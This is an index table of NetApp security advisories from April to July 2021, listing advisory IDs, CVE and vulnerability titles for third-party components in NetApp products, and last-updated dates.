| [**NTAP-20210727-0008**](https://security.netapp.com/advisory/ntap-20210727-0008/) | CVE-2021-31618 Apache HTTP Server Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210727-0007**](https://security.netapp.com/advisory/ntap-20210727-0007/) | June 2021 cURL/libcURL Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210727-0004**](https://security.netapp.com/advisory/ntap-20210727-0004/) | June 2021 Django Vulnerabilities in NetApp Products | 2021-07-27 |
| [**NTAP-20210723-0002**](https://security.netapp.com/advisory/ntap-20210723-0002/) | July 2021 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-11-21 |
| [**NTAP-20210723-0001**](https://security.netapp.com/advisory/ntap-20210723-0001/) | July 2021 MySQL Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210720-0002**](https://security.netapp.com/advisory/ntap-20210720-0002/) | CVE-2018-25015 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210720-0003**](https://security.netapp.com/advisory/ntap-20210720-0003/) | CVE-2019-25045 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20210720-0010**](https://security.netapp.com/advisory/ntap-20210720-0010/) | CVE-2020-27661 QEMU Vulnerability in NetApp Products | 2021-07-20 |
| [**NTAP-20210720-0004**](https://security.netapp.com/advisory/ntap-20210720-0004/) | CVE-2020-36385 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210720-0001**](https://security.netapp.com/advisory/ntap-20210720-0001/) | CVE-2020-7469 FreeBSD Vulnerability in NetApp Products | 2022-03-22 |
| [**NTAP-20210720-0009**](https://security.netapp.com/advisory/ntap-20210720-0009/) | CVE-2021-20181 QEMU Vulnerability in NetApp Products | 2021-07-20 |
| [**NTAP-20210720-0007**](https://security.netapp.com/advisory/ntap-20210720-0007/) | CVE-2021-20461 IBM Cognos Analytics Vulnerability in NetApp Products | 2022-04-01 |
| [**NTAP-20210720-0005**](https://security.netapp.com/advisory/ntap-20210720-0005/) | CVE-2021-29702 IBM DB2 Vulnerability in NetApp Products | 2021-07-20 |
| [**NTAP-20210720-0006**](https://security.netapp.com/advisory/ntap-20210720-0006/) | July 2021 IBM DB2 Vulnerabilities in NetApp Products | 2021-07-20 |
| [**NTAP-20210720-0008**](https://security.netapp.com/advisory/ntap-20210720-0008/) | June 2021 QEMU Vulnerabilities in NetApp Products | 2021-07-20 |
| [**NTAP-20210716-0001**](https://security.netapp.com/advisory/ntap-20210716-0001/) | CVE-2021-0051 Intel SPS Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210716-0002**](https://security.netapp.com/advisory/ntap-20210716-0002/) | CVE-2021-0129 Intel BlueZ Vulnerability in NetApp Products | 2021-07-16 |
| [**NTAP-20210716-0008**](https://security.netapp.com/advisory/ntap-20210716-0008/) | CVE-2021-26707 Node.js Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210716-0005**](https://security.netapp.com/advisory/ntap-20210716-0005/) | CVE-2021-3516 Libxml2 Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210716-0006**](https://security.netapp.com/advisory/ntap-20210716-0006/) | CVE-2021-3530 GNU Binutils Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210716-0004**](https://security.netapp.com/advisory/ntap-20210716-0004/) | June 2021 Linux Kernel 5.12.4 Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210716-0003**](https://security.netapp.com/advisory/ntap-20210716-0003/) | June 2021 OpenLDAP Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210716-0007**](https://security.netapp.com/advisory/ntap-20210716-0007/) | June 2021 Squid Vulnerabilities in NetApp Products | 2021-09-27 |
| [**NTAP-20210713-0001**](https://security.netapp.com/advisory/ntap-20210713-0001/) | CVE-2020-14326 RESTEasy Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20210713-0005**](https://security.netapp.com/advisory/ntap-20210713-0005/) | CVE-2021-22118 Spring Framework Vulnerability in NetApp Products | 2021-10-25 |
| [**NTAP-20210713-0002**](https://security.netapp.com/advisory/ntap-20210713-0002/) | CVE-2021-29628 FreeBSD Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20210713-0003**](https://security.netapp.com/advisory/ntap-20210713-0003/) | CVE-2021-29629 FreeBSD Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20210713-0004**](https://security.netapp.com/advisory/ntap-20210713-0004/) | CVE-2021-32027 PostgreSQL Vulnerability in NetApp Products | 2021-08-05 |
| [**NTAP-20210713-0006**](https://security.netapp.com/advisory/ntap-20210713-0006/) | May 2021 QEMU Vulnerabilities in NetApp Products | 2021-07-13 |
| [**NTAP-20210708-0001**](https://security.netapp.com/advisory/ntap-20210708-0001/) | CVE-2020-10701 Libvirt Vulnerability in NetApp Products | 2021-07-08 |
| [**NTAP-20210708-0004**](https://security.netapp.com/advisory/ntap-20210708-0004/) | CVE-2021-20196 QEMU Vulnerability in NetApp Products | 2021-07-08 |
| [**NTAP-20210708-0005**](https://security.netapp.com/advisory/ntap-20210708-0005/) | CVE-2021-20221 QEMU Vulnerability in NetApp Products | 2021-07-08 |
| [**NTAP-20210708-0002**](https://security.netapp.com/advisory/ntap-20210708-0002/) | CVE-2021-22543 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210708-0006**](https://security.netapp.com/advisory/ntap-20210708-0006/) | CVE-2021-23017 NGINX Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210708-0007**](https://security.netapp.com/advisory/ntap-20210708-0007/) | CVE-2021-29505 XStream Vulnerability in NetApp Products | 2022-09-15 |
| [**NTAP-20210708-0003**](https://security.netapp.com/advisory/ntap-20210708-0003/) | CVE-2021-30465 Opencontainers-runc Vulnerability in NetApp Products | 2021-07-08 |
| [**NTAP-20210708-0008**](https://security.netapp.com/advisory/ntap-20210708-0008/) | CVE-2021-3527 QEMU Vulnerability in NetApp Products | 2021-07-08 |
| [**NTAP-20210706-0008**](https://security.netapp.com/advisory/ntap-20210706-0008/) | CVE-2020-10688 RESTEasy Vulnerability in NetApp Products | 2021-07-06 |
| [**NTAP-20210706-0003**](https://security.netapp.com/advisory/ntap-20210706-0003/) | CVE-2021-31440 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210706-0005**](https://security.netapp.com/advisory/ntap-20210706-0005/) | CVE-2021-32640 Node.js Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210706-0004**](https://security.netapp.com/advisory/ntap-20210706-0004/) | CVE-2021-33200 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210706-0001**](https://security.netapp.com/advisory/ntap-20210706-0001/) | CVE-2021-33502 Node.js Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210706-0007**](https://security.netapp.com/advisory/ntap-20210706-0007/) | CVE-2021-33587 Node.js Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210706-0006**](https://security.netapp.com/advisory/ntap-20210706-0006/) | CVE-2021-3559 Libvirt Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210702-0005**](https://security.netapp.com/advisory/ntap-20210702-0005/) | CVE-2020-25668 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20210702-0006**](https://security.netapp.com/advisory/ntap-20210702-0006/) | CVE-2020-25669 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210702-0003**](https://security.netapp.com/advisory/ntap-20210702-0003/) | CVE-2020-25724 RESTEasy Vulnerability in NetApp Products | 2021-11-24 |
| [**NTAP-20210702-0004**](https://security.netapp.com/advisory/ntap-20210702-0004/) | CVE-2020-27815 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210702-0007**](https://security.netapp.com/advisory/ntap-20210702-0007/) | CVE-2021-33623 Node.js Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210702-0002**](https://security.netapp.com/advisory/ntap-20210702-0002/) | Intel SA-00463 BIOS Firmware Vulnerabilities in NetApp Products | 2022-09-07 |
| [**NTAP-20210702-0001**](https://security.netapp.com/advisory/ntap-20210702-0001/) | June 2021 Apache HTTP Server Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210702-0008**](https://security.netapp.com/advisory/ntap-20210702-0008/) | June 2021 Linux Kernel Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210629-0006**](https://security.netapp.com/advisory/ntap-20210629-0006/) | CVE-2019-25044 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210629-0004**](https://security.netapp.com/advisory/ntap-20210629-0004/) | CVE-2019-4588 IBM DB2 Vulnerability in NetApp Products | 2021-06-29 |
| [**NTAP-20210629-0007**](https://security.netapp.com/advisory/ntap-20210629-0007/) | CVE-2020-14301 Libvirt Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210629-0001**](https://security.netapp.com/advisory/ntap-20210629-0001/) | CVE-2021-22138 Logstash Vulnerability in NetApp Products | 2021-06-29 |
| [**NTAP-20210629-0005**](https://security.netapp.com/advisory/ntap-20210629-0005/) | CVE-2021-33574 GNU C Library (glibc) Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210629-0003**](https://security.netapp.com/advisory/ntap-20210629-0003/) | CVE-2021-3426 Python Vulnerability in NetApp Products | 2024-03-04 |
| [**NTAP-20210629-0002**](https://security.netapp.com/advisory/ntap-20210629-0002/) | CVE-2021-3483 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210625-0005**](https://security.netapp.com/advisory/ntap-20210625-0005/) | CVE-2020-13529 Systemd Vulnerability in NetApp Products | 2022-06-29 |
| [**NTAP-20210625-0008**](https://security.netapp.com/advisory/ntap-20210625-0008/) | CVE-2020-24516 Intel CSME Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210625-0004**](https://security.netapp.com/advisory/ntap-20210625-0004/) | CVE-2020-27830 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210625-0009**](https://security.netapp.com/advisory/ntap-20210625-0009/) | CVE-2021-0095 Intel Processor Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20210625-0007**](https://security.netapp.com/advisory/ntap-20210625-0007/) | CVE-2021-23134 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210625-0001**](https://security.netapp.com/advisory/ntap-20210625-0001/) | CVE-2021-32606 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210625-0006**](https://security.netapp.com/advisory/ntap-20210625-0006/) | CVE-2021-33204 PostgreSQL Vulnerability in NetApp Products | 2021-08-12 |
| [**NTAP-20210625-0003**](https://security.netapp.com/advisory/ntap-20210625-0003/) | May 2021 Elasticsearch Vulnerabilities in NetApp Products | 2021-06-25 |
| [**NTAP-20210625-0002**](https://security.netapp.com/advisory/ntap-20210625-0002/) | May 2021 Libxml2 Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20210622-0007**](https://security.netapp.com/advisory/ntap-20210622-0007/) | CVE-2020-15522 Bouncy Castle Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20210622-0005**](https://security.netapp.com/advisory/ntap-20210622-0005/) | CVE-2021-29489 Highcharts Vulnerability in NetApp Products | 2022-06-27 |
| [**NTAP-20210622-0002**](https://security.netapp.com/advisory/ntap-20210622-0002/) | CVE-2021-29491 Node.js Vulnerability in NetApp Products | 2021-06-22 |
| [**NTAP-20210622-0003**](https://security.netapp.com/advisory/ntap-20210622-0003/) | CVE-2021-29921 Python Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210622-0006**](https://security.netapp.com/advisory/ntap-20210622-0006/) | CVE-2021-32399 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210622-0001**](https://security.netapp.com/advisory/ntap-20210622-0001/) | February 2021 MySQL Client Vulnerabilities in NetApp Products | 2022-08-29 |
| [**NTAP-20210622-0004**](https://security.netapp.com/advisory/ntap-20210622-0004/) | June 2021 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2021-06-22 |
| [**NTAP-20210618-0009**](https://security.netapp.com/advisory/ntap-20210618-0009/) | CVE-2020-35519 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210618-0003**](https://security.netapp.com/advisory/ntap-20210618-0003/) | CVE-2021-21414 Node.js Vulnerability in NetApp Products | 2021-06-18 |
| [**NTAP-20210618-0007**](https://security.netapp.com/advisory/ntap-20210618-0007/) | CVE-2021-23383 Node.js Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210618-0005**](https://security.netapp.com/advisory/ntap-20210618-0005/) | CVE-2021-28860 Node.js Vulnerability in NetApp Products | 2021-06-18 |
| [**NTAP-20210618-0006**](https://security.netapp.com/advisory/ntap-20210618-0006/) | CVE-2021-29484 Node.js Vulnerability in NetApp Products | 2021-06-18 |
| [**NTAP-20210618-0001**](https://security.netapp.com/advisory/ntap-20210618-0001/) | CVE-2021-31542 Django Vulnerability in NetApp Products | 2021-06-18 |
| [**NTAP-20210618-0010**](https://security.netapp.com/advisory/ntap-20210618-0010/) | CVE-2021-31542 Django Vulnerability in NetApp Products | 2021-06-18 |
| [**NTAP-20210618-0004**](https://security.netapp.com/advisory/ntap-20210618-0004/) | CVE-2021-31597 Node.js Vulnerability in NetApp Products | 2021-06-18 |
| [**NTAP-20210618-0002**](https://security.netapp.com/advisory/ntap-20210618-0002/) | CVE-2021-31879 GNU Wget Vulnerability in NetApp Products | 2024-11-14 |
| [**NTAP-20210618-0008**](https://security.netapp.com/advisory/ntap-20210618-0008/) | CVE-2021-3501 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210611-0006**](https://security.netapp.com/advisory/ntap-20210611-0006/) | April 2021 Eclipse Jetty Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210611-0003**](https://security.netapp.com/advisory/ntap-20210611-0003/) | CVE-2020-24509 Intel SPS Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210611-0008**](https://security.netapp.com/advisory/ntap-20210611-0008/) | CVE-2021-23133 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210611-0009**](https://security.netapp.com/advisory/ntap-20210611-0009/) | CVE-2021-27905 Apache Solr Vulnerability in NetApp Products | 2021-06-11 |
| [**NTAP-20210611-0010**](https://security.netapp.com/advisory/ntap-20210611-0010/) | CVE-2021-29469 Node.js Vulnerability in NetApp Products | 2021-06-11 |
| [**NTAP-20210611-0001**](https://security.netapp.com/advisory/ntap-20210611-0001/) | CVE-2021-31231 Grafana Vulnerability in NetApp Products | 2021-06-11 |
| [**NTAP-20210611-0002**](https://security.netapp.com/advisory/ntap-20210611-0002/) | CVE-2021-32052 Django Vulnerability in NetApp Products | 2021-06-11 |
| [**NTAP-20210611-0007**](https://security.netapp.com/advisory/ntap-20210611-0007/) | CVE-2021-3506 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210611-0004**](https://security.netapp.com/advisory/ntap-20210611-0004/) | Intel SA-00459 CSME Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210611-0005**](https://security.netapp.com/advisory/ntap-20210611-0005/) | Intel SA-00464 Intel Processor Vulnerabilities in NetApp Products | 2022-09-07 |
| [**NTAP-20210610-0001**](https://security.netapp.com/advisory/ntap-20210610-0001/) | CVE-2021-26993 Denial of Service Vulnerability in E-Series SANtricity OS Controller Software 11.x | 2021-06-10 |
| [**NTAP-20210610-0002**](https://security.netapp.com/advisory/ntap-20210610-0002/) | CVE-2021-26995 Remote Code Execution Vulnerability in E-Series SANtricity OS Controller Software 11.x | 2021-06-10 |
| [**NTAP-20210610-0003**](https://security.netapp.com/advisory/ntap-20210610-0003/) | CVE-2021-26996 Information Disclosure Vulnerability in E-Series SANtricity OS Controller Software 11.x | 2021-06-10 |
| [**NTAP-20210610-0004**](https://security.netapp.com/advisory/ntap-20210610-0004/) | CVE-2021-26997 Information Disclosure in E-Series SANtricity OS Controller Software 11.x | 2021-06-10 |
| [**NTAP-20210604-0009**](https://security.netapp.com/advisory/ntap-20210604-0009/) | April 2021 Apache Solr Vulnerabilities in NetApp Products | 2021-06-04 |
| [**NTAP-20210604-0010**](https://security.netapp.com/advisory/ntap-20210604-0010/) | CVE-2020-15225 Django Vulnerability in NetApp Products | 2021-06-04 |
| [**NTAP-20210604-0005**](https://security.netapp.com/advisory/ntap-20210604-0005/) | CVE-2020-36313 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210604-0008**](https://security.netapp.com/advisory/ntap-20210604-0008/) | CVE-2021-23369 Node.js Vulnerability in NetApp Products | 2021-06-04 |
| [**NTAP-20210604-0004**](https://security.netapp.com/advisory/ntap-20210604-0004/) | CVE-2021-26073 Node.JS Vulnerability in NetApp Products | 2021-06-04 |
| [**NTAP-20210604-0006**](https://security.netapp.com/advisory/ntap-20210604-0006/) | CVE-2021-29154 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210604-0001**](https://security.netapp.com/advisory/ntap-20210604-0001/) | CVE-2021-29418 Node.js Vulnerability in NetApp Products | 2021-06-04 |
| [**NTAP-20210604-0007**](https://security.netapp.com/advisory/ntap-20210604-0007/) | CVE-2021-29424 Perl Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210604-0002**](https://security.netapp.com/advisory/ntap-20210604-0002/) | CVE-2021-29662 Perl Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210604-0003**](https://security.netapp.com/advisory/ntap-20210604-0003/) | March 2021 Apache Netty Vulnerabilities in NetApp Products | 2022-08-29 |
| [**NTAP-20210601-0001**](https://security.netapp.com/advisory/ntap-20210601-0001/) | CVE-2021-26994 Denial of Service Vulnerability in Clustered Data ONTAP | 2021-06-01 |
| [**NTAP-20210528-0009**](https://security.netapp.com/advisory/ntap-20210528-0009/) | CVE-2021-20197 GNU Binutils Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210528-0008**](https://security.netapp.com/advisory/ntap-20210528-0008/) | CVE-2021-20289 RESTEasy Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20210528-0006**](https://security.netapp.com/advisory/ntap-20210528-0006/) | CVE-2021-21267 Node.js Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210528-0007**](https://security.netapp.com/advisory/ntap-20210528-0007/) | CVE-2021-26296 Apache MyFaces Vulnerability in NetApp Products | 2021-06-18 |
| [**NTAP-20210528-0002**](https://security.netapp.com/advisory/ntap-20210528-0002/) | CVE-2021-27850 Apache Tapestry Vulnerability in NetApp Products | 2021-05-28 |
| [**NTAP-20210528-0001**](https://security.netapp.com/advisory/ntap-20210528-0001/) | CVE-2021-28658 Django Vulnerability in NetApp Products | 2021-05-28 |
| [**NTAP-20210528-0010**](https://security.netapp.com/advisory/ntap-20210528-0010/) | CVE-2021-28918 Node.js Vulnerability in NetApp Products | 2021-05-28 |
| [**NTAP-20210528-0003**](https://security.netapp.com/advisory/ntap-20210528-0003/) | CVE-2021-28965 Ruby Vulnerability in NetApp Products | 2021-05-28 |
| [**NTAP-20210528-0004**](https://security.netapp.com/advisory/ntap-20210528-0004/) | CVE-2021-30638 Apache Tapestry Vulnerability in NetApp Products | 2021-05-28 |
| [**NTAP-20210528-0005**](https://security.netapp.com/advisory/ntap-20210528-0005/) | CVE-2021-3507 QEMU Vulnerability in NetApp Products | 2021-05-28 |
| [**NTAP-20210521-0007**](https://security.netapp.com/advisory/ntap-20210521-0007/) | April 2021 cURL/libcURL Vulnerabilities in NetApp Products | 2022-05-06 |
| [**NTAP-20210521-0006**](https://security.netapp.com/advisory/ntap-20210521-0006/) | April 2021 ISC BIND Vulnerabilities in NetApp Products | 2023-07-07 |
| [**NTAP-20210521-0001**](https://security.netapp.com/advisory/ntap-20210521-0001/) | CVE-2020-12762 JSON-C Vulnerability in NetApp Products | 2021-05-21 |
| [**NTAP-20210521-0005**](https://security.netapp.com/advisory/ntap-20210521-0005/) | CVE-2020-13946 Apache Cassandra Vulnerability in NetApp Products | 2021-05-21 |
| [**NTAP-20210521-0002**](https://security.netapp.com/advisory/ntap-20210521-0002/) | CVE-2020-17516 Apache Cassandra Vulnerability in NetApp Products | 2021-05-21 |
| [**NTAP-20210521-0003**](https://security.netapp.com/advisory/ntap-20210521-0003/) | CVE-2020-27783 lxml Vulnerability in NetApp Products | 2021-07-01 |
| [**NTAP-20210521-0008**](https://security.netapp.com/advisory/ntap-20210521-0008/) | CVE-2020-27825 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20210521-0010**](https://security.netapp.com/advisory/ntap-20210521-0010/) | CVE-2021-20284 GNU Binutils Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210521-0004**](https://security.netapp.com/advisory/ntap-20210521-0004/) | CVE-2021-28957 lxml Vulnerability in NetApp Products | 2021-06-29 |
| [**NTAP-20210521-0009**](https://security.netapp.com/advisory/ntap-20210521-0009/) | March 2021 LibTIFF Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20210513-0001**](https://security.netapp.com/advisory/ntap-20210513-0001/) | April 2021 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-11-21 |
| [**NTAP-20210513-0002**](https://security.netapp.com/advisory/ntap-20210513-0002/) | April 2021 MySQL Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210513-0010**](https://security.netapp.com/advisory/ntap-20210513-0010/) | CVE-2020-13954 Apache CXF Vulnerability in NetApp Products | 2021-07-14 |
| [**NTAP-20210513-0006**](https://security.netapp.com/advisory/ntap-20210513-0006/) | CVE-2020-35508 Linux Kernel Vulnerability in NetApp Products | 2023-03-21 |
| [**NTAP-20210513-0009**](https://security.netapp.com/advisory/ntap-20210513-0009/) | CVE-2020-5421 Spring Framework Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20210513-0003**](https://security.netapp.com/advisory/ntap-20210513-0003/) | CVE-2021-23901 Apache Nutch Vulnerability in NetApp Products | 2021-05-13 |
| [**NTAP-20210513-0004**](https://security.netapp.com/advisory/ntap-20210513-0004/) | CVE-2021-23926 Apache XMLBeans Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210513-0007**](https://security.netapp.com/advisory/ntap-20210513-0007/) | CVE-2021-27358 Grafana Vulnerability in NetApp Products | 2022-03-07 |
| [**NTAP-20210513-0008**](https://security.netapp.com/advisory/ntap-20210513-0008/) | CVE-2021-28092 Node.js Vulnerability in NetApp Products | 2021-05-13 |
| [**NTAP-20210513-0005**](https://security.netapp.com/advisory/ntap-20210513-0005/) | CVE-2021-29266 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210507-0002**](https://security.netapp.com/advisory/ntap-20210507-0002/) | April 2021 QEMU Vulnerabilities in NetApp Products | 2021-05-07 |
| [**NTAP-20210507-0007**](https://security.netapp.com/advisory/ntap-20210507-0007/) | April 2021 Unbound Vulnerabilities in NetApp Products | 2021-05-07 |
| [**NTAP-20210507-0005**](https://security.netapp.com/advisory/ntap-20210507-0005/) | CVE-2020-36309 OpenResty Vulnerability in NetApp Products | 2021-05-07 |
| [**NTAP-20210507-0003**](https://security.netapp.com/advisory/ntap-20210507-0003/) | CVE-2021-20255 QEMU Vulnerability in NetApp Products | 2021-05-07 |
| [**NTAP-20210507-0004**](https://security.netapp.com/advisory/ntap-20210507-0004/) | CVE-2021-28657 Apache Tika Vulnerability in NetApp Products | 2021-05-07 |
| [**NTAP-20210507-0008**](https://security.netapp.com/advisory/ntap-20210507-0008/) | CVE-2021-28660 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210507-0006**](https://security.netapp.com/advisory/ntap-20210507-0006/) | CVE-2021-3393 PostgreSQL Vulnerability in NetApp Products | 2021-05-07 |
| [**NTAP-20210507-0001**](https://security.netapp.com/advisory/ntap-20210507-0001/) | March 2021 QEMU Vulnerabilities in NetApp Products | 2021-05-07 |
| [**NTAP-20210430-0001**](https://security.netapp.com/advisory/ntap-20210430-0001/) | CVE-2021-20254 Samba Vulnerability in NetApp Products | 2021-04-30 |
| [**NTAP-20210430-0006**](https://security.netapp.com/advisory/ntap-20210430-0006/) | CVE-2021-22134 Elasticsearch Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210430-0005**](https://security.netapp.com/advisory/ntap-20210430-0005/) | March 2021 Grafana Vulnerabilities in NetApp Products | 2021-04-30 |
| [**NTAP-20210430-0003**](https://security.netapp.com/advisory/ntap-20210430-0003/) | March 2021 Linux Kernel 5.11.8 Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210430-0004**](https://security.netapp.com/advisory/ntap-20210430-0004/) | March 2021 PostgreSQL Vulnerabilities in NetApp Products | 2021-04-30 |
| [**NTAP-20210430-0002**](https://security.netapp.com/advisory/ntap-20210430-0002/) | March 2021 XStream Vulnerabilities in NetApp Products | 2022-06-27 |
| [**NTAP-20210423-0002**](https://security.netapp.com/advisory/ntap-20210423-0002/) | April 2021 FreeBSD Vulnerabilities in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0001**](https://security.netapp.com/advisory/ntap-20210423-0001/) | CVE-2020-25577 FreeBSD Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0005**](https://security.netapp.com/advisory/ntap-20210423-0005/) | CVE-2020-25580 FreeBSD Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0006**](https://security.netapp.com/advisory/ntap-20210423-0006/) | CVE-2020-25581 FreeBSD Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0003**](https://security.netapp.com/advisory/ntap-20210423-0003/) | CVE-2020-25582 FreeBSD Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0004**](https://security.netapp.com/advisory/ntap-20210423-0004/) | CVE-2020-25583 FreeBSD Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0009**](https://security.netapp.com/advisory/ntap-20210423-0009/) | CVE-2020-25584 FreeBSD Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0010**](https://security.netapp.com/advisory/ntap-20210423-0010/) | CVE-2021-20227 SQLite Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0008**](https://security.netapp.com/advisory/ntap-20210423-0008/) | CVE-2021-29626 FreeBSD Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210423-0007**](https://security.netapp.com/advisory/ntap-20210423-0007/) | CVE-2021-29627 FreeBSD Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20210416-0004**](https://security.netapp.com/advisory/ntap-20210416-0004/) | CVE-2020-14372 Grub2 Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210416-0002**](https://security.netapp.com/advisory/ntap-20210416-0002/) | CVE-2021-28041 OpenSSH Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210416-0003**](https://security.netapp.com/advisory/ntap-20210416-0003/) | CVE-2021-28153 GNOME GLib Vulnerability in NetApp Products | 2022-05-06 |
| [**NTAP-20210416-0006**](https://security.netapp.com/advisory/ntap-20210416-0006/) | CVE-2021-3444 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210416-0005**](https://security.netapp.com/advisory/ntap-20210416-0005/) | March 2021 GnuTLS Vulnerabilities in NetApp Products | 2022-03-07 |
| [**NTAP-20210416-0001**](https://security.netapp.com/advisory/ntap-20210416-0001/) | March 2021 Node.js Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210409-0004**](https://security.netapp.com/advisory/ntap-20210409-0004/) | CVE-2020-26217 XStream Vulnerability in NetApp Products | 2021-05-08 |
| [**NTAP-20210409-0006**](https://security.netapp.com/advisory/ntap-20210409-0006/) | CVE-2021-20268 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210409-0005**](https://security.netapp.com/advisory/ntap-20210409-0005/) | December 2020 XStream Vulnerabilities in NetApp Products | 2021-04-09 |
| [**NTAP-20210409-0002**](https://security.netapp.com/advisory/ntap-20210409-0002/) | March 2021 Apache Tomcat Vulnerabilities in NetApp Products | 2021-06-08 |
| [**NTAP-20210409-0003**](https://security.netapp.com/advisory/ntap-20210409-0003/) | March 2021 IBM DB2 Vulnerabilities in NetApp Products | 2021-06-18 |
| [**NTAP-20210409-0001**](https://security.netapp.com/advisory/ntap-20210409-0001/) | March 2021 Linux Kernel 5.11.3 Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210401-0005**](https://security.netapp.com/advisory/ntap-20210401-0005/) | CVE-2020-27223 Eclipse Jetty Vulnerability in NetApp Products | 2024-07-11 |
| [**NTAP-20210401-0002**](https://security.netapp.com/advisory/ntap-20210401-0002/) | CVE-2020-27543 Node.js Vulnerability in NetApp Products | 2021-04-27 |
| [**NTAP-20210401-0006**](https://security.netapp.com/advisory/ntap-20210401-0006/) | CVE-2020-27618 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210401-0001**](https://security.netapp.com/advisory/ntap-20210401-0001/) | CVE-2021-20226 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210401-0003**](https://security.netapp.com/advisory/ntap-20210401-0003/) | CVE-2021-28375 Linux Kernel Vulnerability in NetApp Products | 2024-10-07 |
